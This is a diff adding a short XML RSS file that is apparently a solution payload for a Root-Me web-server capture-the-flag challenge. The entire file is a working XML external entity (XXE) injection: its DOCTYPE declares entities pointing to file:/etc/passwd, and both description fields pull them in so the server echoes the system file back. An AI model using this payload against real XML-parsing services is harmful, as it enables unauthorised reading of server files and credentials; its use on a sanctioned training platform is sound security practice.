@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ENTITY passwd SYSTEM "file:/etc/passwd">
+  <!ENTITY passwd2 SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Essai 1</title>
+    <description> &passwd; &passwd2;</description>
+    <item>
+    <title>/etc/passwd</title>
+    <description> &passwd; &passwd2;</description>
+    <link>http://challenge01.root-me.org/web-serveur/ch29/index.php</link>
+    </item>
+  </channel>
+</rss>
